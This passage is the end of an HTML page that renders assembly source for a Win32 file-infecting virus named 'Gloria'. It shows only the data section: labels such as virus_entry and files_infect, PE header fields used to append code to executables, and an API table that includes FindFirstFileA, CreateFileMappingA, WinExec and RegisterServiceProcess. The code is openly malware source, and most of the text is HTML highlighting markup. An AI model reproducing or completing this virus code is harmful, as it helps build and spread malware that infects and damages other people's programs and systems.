</span><span class="sc5">file_data</span><span class="sc0">       </span><span class="sc5">win32_find_data</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">; 318 bytes long</span><span class="sc0">
</span><span class="sc5">handle_dir1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">handle_dir2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">handle_new_file</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">handle_old_file</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">handle_mapping</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">handle_find</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">new_file_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_file_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">mem_addr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">peofs</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">tableofs</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">lastsection</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">junk_ofs</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">addr_sys</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">objalign</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">filealign</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">_real_ofs</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">virtualsize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">physicalsize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">virus_entry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">files_infect</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetProc</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">all_sec_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">api_addr</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">FindFirstFileA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">DeleteFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">WinExec</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">CopyFileA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">GetCommandLineA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">RegisterServiceProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">section_space</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; place for sections</span><span class="sc0">
</span><span class="sc5">cmd_line</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">208h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; place for command line</span><span class="sc0">

</span><span class="sc5">virtual_size_gl</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">
</span><span class="sc5">Gloria_end</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">             </span><span class="sc5">Gloria</span><span class="sc0">
</span></div></body>
</html>
